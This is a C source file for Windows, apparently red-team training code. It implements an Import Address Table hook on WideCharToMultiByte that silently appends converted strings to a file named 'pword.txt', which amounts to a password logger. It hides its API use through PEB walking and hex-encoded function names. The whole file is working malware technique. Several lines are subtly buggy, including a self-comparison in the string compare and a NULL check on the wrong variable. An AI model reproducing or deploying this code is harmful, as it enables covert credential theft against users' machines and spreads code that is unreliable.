#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>

typedef struct _unicode_string
{
    USHORT Length;
    USHORT MaxLength;
    PWSTR Buffer;
} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _ldr_data_table_entry
{
#ifdef _M_X64
    BYTE Dummy[48];
    PVOID64 pvDllBase;
    PVOID64 EntryPoint;
    DWORD64 SizeOfImage;
#else
    BYTE Dummy[24];
    PVOID pvDllBase;
    PVOID EntryPoint;
    DWORD32 SizeOfImage;
#endif
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

void HookIAT(void);

int main(void)
{
    HookIAT();

    return 0;
}

size_t MyStrLen(CHAR *str)
{
    size_t strlen = 0;
    while (*str++ != 0)
    {
        ++strlen;
    }

    return strlen;
}

BOOL MyStrCmpiAW(CHAR *sStr1, WCHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    for (size_t c = 0; c < MyStrLen(sStr1); ++c)
    {
        if (sStr1[c] != sStr2[c])
        {
            if (sStr1[c] < sStr2[c])
            {
                if ((sStr1[c] + 32) != sStr2[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
            else if (sStr2[c] < sStr2[c])
            {
                if ((sStr2[c] + 32) != sStr1[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
        }
    }

    return bAreEqual;
}

BOOL MyStrCmpiAA(CHAR *sStr1, CHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    for (size_t c = 0; c < MyStrLen(sStr1); ++c)
    {
        if (sStr1[c] != sStr2[c])
        {
            if (sStr1[c] < sStr2[c])
            {
                if ((sStr1[c] + 32) != sStr2[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
            else if (sStr2[c] < sStr1[c])
            {
                if ((sStr2[c] + 32) != sStr1[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
        }
    }

    return bAreEqual;
}

ULONG_PTR MyGetKernelModuleHandle(void)
{
#ifdef _M_X64
    PEB *pPeb = (PEB *)__readgsqword(0x60);
#else
    PEB *pPeb = (PEB *)__readfsdword(0x30);
#endif

    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;

    char cKernelDLL[] = {0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0};

    while (CurrentListEntry != FirstListEntry)
    {
        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)((ULONG_PTR)CurrentListEntry - sizeof(LIST_ENTRY));

        if (MyStrCmpiAW(cKernelDLL, TableEntry->BaseDllName.Buffer))
        {
            return (ULONG_PTR)TableEntry->pvDllBase;
        }

        CurrentListEntry = CurrentListEntry->Flink;
    }

    return NULL;
}

LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
{
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ulModuleAddr;
    IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(ulModuleAddr + DosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(ulModuleAddr + ExportDataDirectory.VirtualAddress);

    DWORD *AddressOfFunctions = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfFunctions);
    DWORD *AddressOfNames = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNames);
    WORD *AddressOfNameOridinals = (WORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);

    ULONG_PTR lpvProcAddr = NULL;
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        if (MyStrCmpiAA(sProcName, (ulModuleAddr + AddressOfNames[n])))
        {
            lpvProcAddr = (ULONG_PTR)(ulModuleAddr + AddressOfFunctions[AddressOfNameOridinals[n]]);
            break;
        }
    }

    return (LPVOID)lpvProcAddr;
}

int HookedWideCharToMultiByteIAT(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    ULONG_PTR hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
    FARPROC(WINAPI * pGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = MyGetProcAddressByName(hKernel, cGetProcAddress);

    char cWideCharToMultiByte[] = {0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0};
    int(WINAPI * pWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar) = pGetProcAddress(hKernel, cWideCharToMultiByte);

    int BytesWritten = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    char cCreateFileA[] = {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41, 0};
    HANDLE(WINAPI * pCreateFileA)
    (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwSharedMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = pGetProcAddress(hKernel, cCreateFileA);

    char cFilePath[] = {0x43, 0x3a, 0x5c, 0x5c, 0x52, 0x54, 0x4f, 0x5c, 0x5c, 0x70, 0x77, 0x6f, 0x72, 0x64, 0x2e, 0x74, 0x78, 0x74, 0};
    HANDLE hFile = pCreateFileA(cFilePath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char cWriteFile[] = {0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0};
        BOOL(WINAPI * pWriteFile)
        (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = pGetProcAddress(hKernel, cWriteFile);
        pWriteFile(hFile, lpMultiByteStr, BytesWritten, NULL, NULL);

        char cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
        BOOL(WINAPI * pCloseHandle)
        (HANDLE hObject) = pGetProcAddress(hKernel, cCloseHandle);

        pCloseHandle(hFile);
    }


shutdown:
    return BytesWritten;
}

void HookIAT(void)
{
    ULONG_PTR hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
    FARPROC(WINAPI * pGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = MyGetProcAddressByName(hKernel, cGetProcAddress);

    char cLoadLibraryA[] = {0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0};
    HMODULE(WINAPI * pLoadLibraryA)
    (LPCSTR lpLibFileName) = pGetProcAddress((HMODULE)hKernel, cLoadLibraryA);

    char cWideCharToMultiByte[] = {0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0};
    int(WINAPI * pWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar) = pGetProcAddress(hKernel, cWideCharToMultiByte);

    char cDbgHelp[] = {0x44, 0x62, 0x67, 0x48, 0x65, 0x6c, 0x70, 0};
    HMODULE hDbgHelp = pLoadLibraryA(cDbgHelp);
    if (cDbgHelp == NULL)
    {
        goto shutdown;
    }

    char cImageDirectoryEntryToDataEx[] = {0x49, 0x6d, 0x61, 0x67, 0x65, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x54, 0x6f, 0x44, 0x61, 0x74, 0x61, 0x45, 0x78, 0};
    PVOID(WINAPI * pImageDirectoryEntryToDataEx)
    (PVOID Base, BOOLEAN MappedAsImage, USHORT DirectoryEntry, PULONG Size, PIMAGE_SECTION_HEADER * FoundHeader) = pGetProcAddress(hDbgHelp, cImageDirectoryEntryToDataEx);

    char cGetModuleHandleA[] = {0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x41, 0};
    HMODULE(WINAPI * pGetModuleHandleA)
    (LPCSTR lpModuleName) = pGetProcAddress(hKernel, cGetModuleHandleA);

    ULONG size = 0;
    ULONG_PTR pBaseAddr = (ULONG_PTR)pGetModuleHandleA(NULL);

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)pImageDirectoryEntryToDataEx((PVOID)pBaseAddr, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size, NULL);

    ULONG ulDLLIndex = 0;
    BOOL bDLLFound = FALSE;

    char cVirtualProtect[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0};
    BOOL(WINAPI * pVirtualProtect)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpfOldProtect) = pGetProcAddress(hKernel, cVirtualProtect);

    char cKernelDLL[] = {0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0};
    for (ulDLLIndex = 0; ulDLLIndex < size; ++ulDLLIndex)
    {
        char *dllName = (char *)(pBaseAddr + pImageImportDescriptor[ulDLLIndex].Name);

        if (MyStrCmpiAA(dllName, cKernelDLL))
        {
            bDLLFound = TRUE;
            break;
        }
    }

    if (!bDLLFound)
    {
        goto shutdown;
    }

    PROC ulWideCharToMultiByte = (PROC)pWideCharToMultiByte;

    PIMAGE_THUNK_DATA pImageThunkData = (PIMAGE_THUNK_DATA)(pBaseAddr + pImageImportDescriptor[ulDLLIndex].FirstThunk);

    while (pImageThunkData->u1.Function)
    {
        PROC *ulFuncAddr = (PROC *)&pImageThunkData->u1.Function;
        if (*ulFuncAddr == ulWideCharToMultiByte)
        {
            DWORD dwOldProtect = 0;

            pVirtualProtect((LPVOID)ulFuncAddr, 4096, PAGE_READWRITE, &dwOldProtect);
            *ulFuncAddr = (PROC)HookedWideCharToMultiByteIAT;

            pVirtualProtect((LPVOID)ulFuncAddr, 4096, dwOldProtect, &dwOldProtect);
            return;
        }

        ++pImageThunkData;
    }

shutdown:
    return;
}
